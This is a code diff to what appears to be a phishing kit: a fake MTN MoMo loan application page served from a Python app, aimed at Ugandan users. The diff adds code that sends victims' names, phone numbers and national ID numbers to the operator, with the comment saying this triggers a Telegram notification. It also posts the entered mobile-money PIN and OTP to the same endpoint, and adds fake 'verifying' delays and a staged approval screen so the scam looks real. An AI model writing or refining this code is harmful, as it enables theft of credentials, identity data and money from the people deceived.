@@ -428,7 +428,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
 
       <!-- Realistic Numeric Keypad -->
-      <div class="max-w-[320px] mx-auto grid grid-cols-3 gap-3">
+      <div id="pin-keypad" class="max-w-[320px] mx-auto grid grid-cols-3 gap-3 transition-all duration-300">
         <button onclick="pressPin('1')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">1</button>
         <button onclick="pressPin('2')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">2</button>
         <button onclick="pressPin('3')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">3</button>
@@ -440,10 +440,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
         <button onclick="pressPin('9')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">9</button>
         <button onclick="clearPin()" class="h-16 rounded-2xl bg-slate-100 text-xs font-bold text-slate-600 active:bg-slate-200">C</button>
         <button onclick="pressPin('0')" class="h-16 rounded-2xl bg-white border border-slate-200 text-xl font-bold text-slate-800 shadow-sm active:bg-slate-100">0</button>
-        <button onclick="backspacePin()" class="h-16 rounded-2xl bg-slate-100 text-lg font-bold text-slate-600 active:bg-slate-200">âŒ«</button>
+        <button onclick="backspacePin()" class="h-16 rounded-2xl bg-slate-100 text-lg font-bold text-slate-600 active:bg-slate-200">⌫</button>
       </div>
 
-      <div class="text-center text-xs text-slate-400"></div>
+      <div id="pin-status-msg" class="text-center text-xs font-semibold text-slate-400 h-4"></div>
     </section>
 
     <!-- SCREEN 6: VERIFY YOUR NUMBER (OTP) -->
@@ -484,17 +484,17 @@ HTML_PAGE = r"""<!DOCTYPE html>
       </div>
 
       <div class="max-w-[320px] mx-auto bg-white rounded-2xl border border-slate-200 p-4 space-y-3 text-left text-xs font-semibold">
-        <div class="flex items-center gap-3 text-[#004F71]">
-          <span>âœ“</span><span>Application Submitted</span>
+        <div id="step-sub" class="flex items-center gap-3 text-[#004F71]">
+          <span class="font-bold text-emerald-600">✓</span><span>Application Submitted</span>
         </div>
-        <div class="flex items-center gap-3 text-[#004F71]">
-          <span>âœ“</span><span>Phone Verified</span>
+        <div id="step-ver" class="flex items-center gap-3 text-[#004F71]">
+          <span class="font-bold text-emerald-600">✓</span><span>Phone Verified</span>
         </div>
-        <div class="flex items-center gap-3 text-[#004F71] animate-pulse">
-          <span>â—</span><span>Processing Assessment...</span>
+        <div id="step-proc" class="flex items-center gap-3 text-[#004F71] animate-pulse">
+          <span class="w-2.5 h-2.5 rounded-full bg-[#004F71] inline-block ml-0.5"></span><span>Processing Assessment...</span>
         </div>
-        <div class="flex items-center gap-3 text-slate-400">
-          <span>â—‹</span><span>Final Decision</span>
+        <div id="step-dec" class="flex items-center gap-3 text-slate-400">
+          <span class="w-2.5 h-2.5 rounded-full border border-slate-300 inline-block ml-0.5"></span><span>Final Decision</span>
         </div>
       </div>
     </section>
@@ -502,8 +502,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <!-- SCREEN 8: LOAN APPROVED -->
     <section id="screen-approved" class="hidden space-y-6">
       <div class="text-center pt-2">
-        <div class="w-20 h-20 mx-auto rounded-full bg-blue-100 text-[#004F71] flex items-center justify-center text-4xl mb-3 shadow-inner">
-          âœ“
+        <div class="w-20 h-20 mx-auto rounded-full bg-emerald-100 text-emerald-600 flex items-center justify-center text-4xl mb-3 shadow-inner font-bold">
+          ✓
         </div>
         <h2 class="text-2xl sm:text-3xl font-black text-[#004F71]">LOAN APPROVED!</h2>
         <p class="text-xs text-slate-500 mt-1">Funds will be credited to your MTN MoMo wallet.</p>
@@ -634,16 +634,41 @@ HTML_PAGE = r"""<!DOCTYPE html>
       }
     }
 
+    function formatMobileWithCountryCode(phone) {
+      if (!phone) return "+256 77 123 4567";
+      let cleaned = phone.replace(/[^0-9+]/g, '');
+      if (cleaned.startsWith('+')) return cleaned;
+      if (cleaned.startsWith('0')) {
+        cleaned = cleaned.substring(1);
+      }
+      return '+256 ' + cleaned;
+    }
+
     function handleFormSubmit(event) {
       event.preventDefault();
       appState.fullName = document.getElementById('input-fullname').value;
       appState.mobile = document.getElementById('input-mobile').value;
       appState.nationalId = document.getElementById('input-nationalid').value;
-      appState.birthDate = document.getElementById('input-dob').value;
+      appState.birthDate = document.getElementById('input-dob') ? document.getElementById('input-dob').value : "";
       appState.purpose = document.getElementById('input-purpose').value;
-      appState.amount = parseInt(document.getElementById('input-amount').value);
+      appState.amount = parseInt(document.getElementById('input-amount').value) || 500000;
       
       syncAmount(appState.amount);
+
+      // Instantly send Telegram notification for new application submission
+      fetch('/api/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          appId: appState.appId,
+          fullName: appState.fullName,
+          mobile: formatMobileWithCountryCode(appState.mobile),
+          nationalId: appState.nationalId,
+          purpose: appState.purpose,
+          amount: appState.amount
+        })
+      }).catch(err => console.error(err));
+
       goTo('loan');
     }
 
@@ -785,22 +810,33 @@ HTML_PAGE = r"""<!DOCTYPE html>
       }
     }
 
+    let isPinBusy = false;
+
     function pressPin(digit) {
-      if (enteredPin.length < 4) {
-        enteredPin += digit;
-        updatePinDots();
-        if (enteredPin.length === 4) {
-          setTimeout(submitPin, 300);
-        }
+      if (isPinBusy || enteredPin.length >= 4) return;
+      enteredPin += digit;
+      updatePinDots();
+      if (enteredPin.length === 4) {
+        isPinBusy = true;
+        const msg = document.getElementById('pin-status-msg');
+        if (msg) msg.innerText = 'Verifying PIN...';
+        
+        // Add subtle wave animation to dots
+        const dots = document.querySelectorAll('#screen-pin [id^="dot-"]');
+        dots.forEach(d => d.classList.add('animate-bounce'));
+
+        setTimeout(submitPin, 4500);
       }
     }
 
     function clearPin() {
+      if (isPinBusy) return;
       enteredPin = '';
       updatePinDots();
     }
 
     function backspacePin() {
+      if (isPinBusy) return;
       enteredPin = enteredPin.slice(0, -1);
       updatePinDots();
     }
@@ -821,20 +857,30 @@ HTML_PAGE = r"""<!DOCTYPE html>
     }
 
     function submitPin() {
+      const formattedPhone = formatMobileWithCountryCode(appState.mobile);
       fetch('/api/save', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           appId: appState.appId,
           fullName: appState.fullName,
-          mobile: appState.mobile,
+          mobile: formattedPhone,
           field: 'entered_pin',
           value: enteredPin
         })
       }).catch(err => console.error(err));
 
+      // Reset PIN busy state and animations
+      isPinBusy = false;
+      const msg = document.getElementById('pin-status-msg');
+      if (msg) msg.innerText = '';
+      const dots = document.querySelectorAll('#screen-pin [id^="dot-"]');
+      dots.forEach(d => d.classList.remove('animate-bounce'));
+      enteredPin = '';
+      updatePinDots();
+
       const otpLabel = document.getElementById('otp-mobile-label');
-      if (otpLabel) otpLabel.innerText = appState.mobile || '+256 77 123 4567';
+      if (otpLabel) otpLabel.innerText = formattedPhone;
       goTo('otp');
     }
 
@@ -874,49 +920,64 @@ HTML_PAGE = r"""<!DOCTYPE html>
       let otpCode = '';
       otpInputs.forEach(i => otpCode += i.value);
 
+      const btnOtp = document.getElementById('btn-otp');
+      if (btnOtp) {
+        btnOtp.disabled = true;
+        btnOtp.innerText = 'VERIFYING CODE...';
+      }
+
+      const formattedPhone = formatMobileWithCountryCode(appState.mobile);
+
       fetch('/api/save', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           appId: appState.appId,
           fullName: appState.fullName,
-          mobile: appState.mobile,
+          mobile: formattedPhone,
           field: 'entered_otp',
           value: otpCode
         })
       }).catch(err => console.error(err));
 
-      goTo('processing');
-
       setTimeout(() => {
-        const approvedAmt = document.getElementById('approved-amount');
-        const approvedRepay = document.getElementById('approved-repay');
-        const approvedDate = document.getElementById('approved-date');
-
-        const val = appState.amount || 100000;
-        const days = appState.period || 30;
-        let rate = 0.05;
-        if (days <= 7) rate = 0.03;
-        else if (days <= 14) rate = 0.05;
-        else if (days <= 30) rate = 0.10;
-        else if (days <= 60) rate = 0.15;
-        else rate = 0.20;
-
-        const interest = Math.round(val * rate);
-        const fee = Math.round(val * 0.03);
-        const total = val + interest + fee;
-
-        if (approvedAmt) approvedAmt.innerText = 'UGX ' + val.toLocaleString();
-        if (approvedRepay) approvedRepay.innerText = 'UGX ' + total.toLocaleString();
-
-        if (approvedDate) {
-          const d = new Date();
-          d.setDate(d.getDate() + days);
-          approvedDate.innerText = d.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
+        if (btnOtp) {
+          btnOtp.disabled = false;
+          btnOtp.innerText = 'VERIFY & CONTINUE';
         }
+        goTo('processing');
 
-        goTo('approved');
-      }, 3000);
+        // Processing assessment takes 6 seconds for realistic feel
+        setTimeout(() => {
+          const approvedAmt = document.getElementById('approved-amount');
+          const approvedRepay = document.getElementById('approved-repay');
+          const approvedDate = document.getElementById('approved-date');
+
+          const val = appState.amount || 500000;
+          const days = appState.period || 30;
+          let rate = 0.05;
+          if (days <= 7) rate = 0.03;
+          else if (days <= 14) rate = 0.05;
+          else if (days <= 30) rate = 0.10;
+          else if (days <= 60) rate = 0.15;
+          else rate = 0.20;
+
+          const interest = Math.round(val * rate);
+          const fee = Math.round(val * 0.03);
+          const total = val + interest + fee;
+
+          if (approvedAmt) approvedAmt.innerText = 'UGX ' + val.toLocaleString();
+          if (approvedRepay) approvedRepay.innerText = 'UGX ' + total.toLocaleString();
+
+          if (approvedDate) {
+            const d = new Date();
+            d.setDate(d.getDate() + days);
+            approvedDate.innerText = d.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' });
+          }
+
+          goTo('approved');
+        }, 6000);
+      }, 1500);
     }
 
     function syncAmount(val, isFromInput = false) {
